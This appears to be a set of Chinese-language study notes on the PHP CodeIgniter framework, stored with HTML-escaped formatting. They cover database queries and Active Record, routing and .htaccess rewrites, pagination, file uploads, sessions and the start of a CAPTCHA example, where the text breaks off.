&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sql&nbsp;=&nbsp;&quot;select&nbsp;*&nbsp;from&nbsp;test&nbsp;where&nbsp;name=?&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;query($sql,$name);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果有多个?时，传入索引数组
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db自动加载:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的AR（数据库增删改查）&nbsp;&nbsp;//&nbsp;简化操作
&nbsp;&nbsp;&nbsp;&nbsp;控制文件中
&nbsp;&nbsp;&nbsp;&nbsp;$active_record&nbsp;=&nbsp;TRUE;&nbsp;//开启AR模型，控制器中可以直接使用$this-&gt;db&nbsp;，false&nbsp;则不可以，只可以使用query
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;1.确保database.php里$active_record&nbsp;=&nbsp;TRUE&nbsp;，开启AR模型
&nbsp;&nbsp;&nbsp;&nbsp;2.在配置文件中，正确配置表前缀后，会自动添加表前缀
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//查
&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;get(&#39;表名&#39;);&nbsp;&nbsp;//返回结果集对象
&nbsp;&nbsp;&nbsp;&nbsp;$res-&gt;result();
&nbsp;&nbsp;&nbsp;&nbsp;//增
&nbsp;&nbsp;&nbsp;&nbsp;$bool&nbsp;=&nbsp;$this-&gt;db-&gt;insert(&#39;表名&#39;,关联数组);
&nbsp;&nbsp;&nbsp;&nbsp;//改
&nbsp;&nbsp;&nbsp;&nbsp;$bool&nbsp;=&nbsp;$this-&gt;db-&gt;update(&#39;表名&#39;,关联数组,条件);//条件应为数组
&nbsp;&nbsp;&nbsp;&nbsp;//删
&nbsp;&nbsp;&nbsp;&nbsp;$bool&nbsp;=&nbsp;$this-&gt;db-&gt;delete(&#39;表名&#39;,条件);
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//连贯操作
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//select&nbsp;*&nbsp;from&nbsp;user&nbsp;where&nbsp;id&gt;=3&nbsp;order&nbsp;by&nbsp;id&nbsp;desc&nbsp;limit&nbsp;2,3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;select(&#39;id,name&#39;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//id大于1，id排序，
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;from(&#39;user&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;where(&#39;id&nbsp;&gt;=&#39;,3)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;limit(3,2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//表示跳过2条，取出3条数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;order_by(&#39;id&nbsp;desc&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&gt;get();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$this-&gt;db-&gt;last_query();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//打印最后一条sql语句
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_dump($res-&gt;result);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//打印结果集
&nbsp;&nbsp;&nbsp;&nbsp;//where方法
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//where方法
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;where(&#39;name&#39;,&#39;jack&#39;)-&gt;get(&#39;user&#39;);&nbsp;&nbsp;&nbsp;&nbsp;//直接传字段，和值
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;where(array(&#39;name&#39;=&gt;&#39;jack&#39;))-&gt;get(&#39;user&#39;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//传数组&nbsp;，&nbsp;name为jack
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;$this-&gt;db-&gt;where(array(&#39;name&#39;=&gt;&#39;jack&#39;,&#39;id&nbsp;&gt;&#39;=&gt;2))-&gt;get(&#39;user&#39;);&nbsp;&nbsp;&nbsp;&nbsp;//id&nbsp;大于2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$res&nbsp;=&nbsp;$this-&gt;db-&gt;where(&#39;name&nbsp;!=&#39;,&#39;jack&#39;)-&gt;get(&#39;user&#39;);&nbsp;&nbsp;&nbsp;&nbsp;//直接传字段，和值&nbsp;name为jack
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$res&nbsp;=&nbsp;$this-&gt;db-&gt;where(&#39;name&nbsp;=&#39;,&#39;jack&#39;)-&gt;get(&#39;user&#39;);&nbsp;&nbsp;&nbsp;&nbsp;//直接传字段，和值&nbsp;&nbsp;name为jack
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;复杂的查询，请用$this-&gt;db-&gt;query($sql,$data);&nbsp;//使用问号参数绑定
&nbsp;&nbsp;&nbsp;&nbsp;
扩展CI的控制器:
&nbsp;&nbsp;&nbsp;&nbsp;在application/core/MY_Controller.php
&nbsp;&nbsp;&nbsp;&nbsp;继承CI的基类，可以重写构造方法，
&nbsp;&nbsp;&nbsp;&nbsp;\\\\system&nbsp;这里面有很多系统的，如果想重写其他的也可以
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;可以修改自定义控制器的前缀&nbsp;在config.php里
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的模型model&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;继承自CI_Model，
&nbsp;&nbsp;&nbsp;&nbsp;application/models
&nbsp;&nbsp;&nbsp;&nbsp;user_model.php（文件名全小写）&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;class&nbsp;User_model(类名首字母大写)
&nbsp;&nbsp;&nbsp;&nbsp;建议使用_model作为后缀，防止和控制器类名冲突
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;在模型中，可以直接使用超级对象中的属性&nbsp;（超级对象就是控制器属性）
&nbsp;&nbsp;&nbsp;&nbsp;模型中的方法，是根据控制器的需求，控制器要什么的数据，就在模型中就OK了
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的url相关函数
&nbsp;&nbsp;&nbsp;&nbsp;htdoc/phpci/
&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;helper(&#39;url&#39;);&nbsp;//加载url函数,可以配置自动加载$autiload[&#39;helper&#39;]&nbsp;=&nbsp;array(&#39;url&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;site_url(&#39;控制器/方法&#39;);&nbsp;&nbsp;&nbsp;&nbsp;//生成url&nbsp;,适用于表单
&nbsp;&nbsp;&nbsp;&nbsp;base_url();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//网站根目录&nbsp;&lt;?php&nbsp;echo&nbsp;base_url();&nbsp;?&gt;upload/girl.jpg
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的路由与伪静态、隐藏index.php入口文件
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;路由：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;配置文件：application\\\\config\\\\routes.php
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认控制器：$route[&#39;default_controller&#39;]&nbsp;=&nbsp;&quot;welcome&quot;;&nbsp;//默认进来访问的页面
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;加入伪静态：&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//http://localhost/phpci/news/4.html
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$route[&#39;news/[\\\\d]+\\\\.html&#39;]&nbsp;=&nbsp;&#39;article/show/$1&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$route[&#39;news/[\\\\d]{6}/([\\\\d]+)\\\\.html&#39;]&nbsp;=&nbsp;&#39;article/show/$1&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;隐藏入口文件index.php：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;开启apache的rewrite模块：apache的配置文件&nbsp;httpd.conf，找rewrite,去掉注释，重置apache
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在入口文件同级目录下建立.htaccess文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;加入以下内容：
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RewriteEngine&nbsp;on&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RewriteCond&nbsp;%{REQUEST_FILENAME}&nbsp;!-f
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RewriteCond&nbsp;%{REQUEST_FILENAME}&nbsp;!-d&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RewriteCond&nbsp;$1&nbsp;!^(index/.php|images|js|css|robots/.txt)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RewriteRule&nbsp;^(.*)$&nbsp;index.php?/$1&nbsp;[L]
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的分页
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//装载类文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;library(&#39;pagination&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;helper(&#39;url&#39;);&nbsp;//加载url辅助函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//配置
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$page_size&nbsp;=&nbsp;10;&nbsp;//每页显示10条数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;base_url&#39;]&nbsp;=&nbsp;site_url(&#39;user/page&#39;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//当前控制器下的当前方法
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;total_rows&#39;]&nbsp;=&nbsp;&#39;200&#39;;&nbsp;&nbsp;&nbsp;&nbsp;//总条数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;per_page&#39;]&nbsp;=&nbsp;&#39;10&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//每页显示条数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;first_link&#39;]&nbsp;=&nbsp;&#39;首页&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;next_link&#39;]&nbsp;=&nbsp;&#39;上一页&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;prev_link&#39;]&nbsp;=&nbsp;&#39;下一页&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;uri_segment&#39;]&nbsp;=&nbsp;3;&nbsp;&nbsp;&nbsp;&nbsp;//分页的数据查询偏移量在哪一段
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;pagination-&gt;initialize($config);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset&nbsp;=&nbsp;intval($this-&gt;uri-&gt;segment(3));&nbsp;&nbsp;//获取第三段的参数值,与$config[&#39;uri_segment&#39;]对应
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$sql&nbsp;=&nbsp;&quot;select&nbsp;*&nbsp;from&nbsp;blog_user&nbsp;limit&nbsp;$offset,$page_size&quot;;&nbsp;//sql语句
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data[&#39;links&#39;]&nbsp;=&nbsp;$this-&gt;pagination-&gt;create_links();&nbsp;//创建上一页，下一页的按钮
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;view(&#39;user/page&#39;,$data);
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的文件上传
&nbsp;&nbsp;&nbsp;&nbsp;1.创建上传目录
&nbsp;&nbsp;&nbsp;&nbsp;2.建立上传页面
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form&nbsp;action=&quot;&lt;?php&nbsp;echo&nbsp;site_url(&#39;user/upload&#39;);&nbsp;?&gt;&quot;&nbsp;method=&quot;post&quot;&nbsp;enctype=&quot;multipart/form-data&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;file&quot;&nbsp;name=&quot;pic&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type=&quot;submit&quot;&nbsp;value=&quot;上传&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;
&nbsp;&nbsp;&nbsp;&nbsp;3.执行上传
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;upload_path&#39;]&nbsp;=&nbsp;&#39;./upload/&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//上传目录，需要手工创建，以入口文件为准
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;allowed_types&#39;]&nbsp;=&nbsp;&#39;gif|png|jpg|jpeg&#39;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//文件允许类型
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$config[&#39;file_name&#39;]&nbsp;=&nbsp;uniqid();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//生成新文件名称
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;library(&#39;upload&#39;,$config);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//加载文件上传类，放入配置文件
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;upload-&gt;do_upload(&#39;pic&#39;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//调用文件上传方法，执行上传，放表单名字
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//var_dump($this-&gt;upload-&gt;data());&nbsp;&nbsp;&nbsp;&nbsp;//打印上传成功&nbsp;返回信息
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data&nbsp;=&nbsp;$this-&gt;upload-&gt;data();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$data[&#39;file_name&#39;];//输出新文件名
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的Session
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//CI中不使用PHP的原声session，默认CI中的session使用的是cookie，
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//SESSION类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;login()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//echo&nbsp;md5(uniqid());&nbsp;&nbsp;//使用它生成一个加密id，填入配置文件中config.php&nbsp;里的$config[&#39;encryption_key&#39;]&nbsp;=&nbsp;&#39;c40e2bfe70d2c6956044f944bdfaaf8b&#39;;选项
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;library(&#39;session&#39;);&nbsp;//一旦被载入,&nbsp;session就可以这样使用：&nbsp;$this-&gt;session
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$user&nbsp;=&nbsp;array(&#39;id&#39;=&gt;3,&#39;name&#39;=&gt;&#39;jack&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;session-&gt;set_userdata(&#39;user&#39;,$user);&nbsp;&nbsp;&nbsp;&nbsp;//将数据放入session中，只允许放KEY&nbsp;和VALUE&nbsp;键值对应的数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//刚放完之后，不要马上在这里获取刚放入的数据,只有页面重新加载或跳转到别的url中才能获取到
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//可以在配置文件中设置加密存放
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$config[&#39;sess_encrypt_cookie&#39;]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;FALSE;&nbsp;//使用加密存放&nbsp;TRUE为是
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//另一种放置数据，可以用于登陆，放入登陆前的url
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;session-&gt;set_flashdata(&#39;test&#39;,&#39;aaaaaa&#39;);&nbsp;&nbsp;//和session原理一样，下次刷新将没有，一次性数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//SESSION类
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;show_session()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//去另一个页面去取&nbsp;CI&nbsp;中session的数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;library(&#39;session&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$user&nbsp;=&nbsp;$this-&gt;session-&gt;userdata(&#39;user&#39;);&nbsp;//获取session中的数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var_dump($user);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$test&nbsp;=&nbsp;$this-&gt;session-&gt;flashdata(&#39;test&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;$test;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;
CI中的验证码,CAPTCHA&nbsp;辅助函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.先手动在index入口文件同级目录下，创建文件夹
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.//验证码
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;code()&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;helper(&#39;url&#39;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;load-&gt;helper(&#39;captcha&#39;);&nbsp;//是辅助函数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$vals&nbsp;=&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&#39;word&#39;&nbsp;=&gt;&nbsp;rand(1000,9999),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//指定随机字符串
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;img_path&#39;&nbsp;=&gt;&nbsp;&#39;./codeimg/&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//验证码存放目录，手动创建&nbsp;，必须参数
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;img_url&#39;&nbsp;=&gt;&nbsp;base_url().&#39;/codeimg/&#39;,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//url
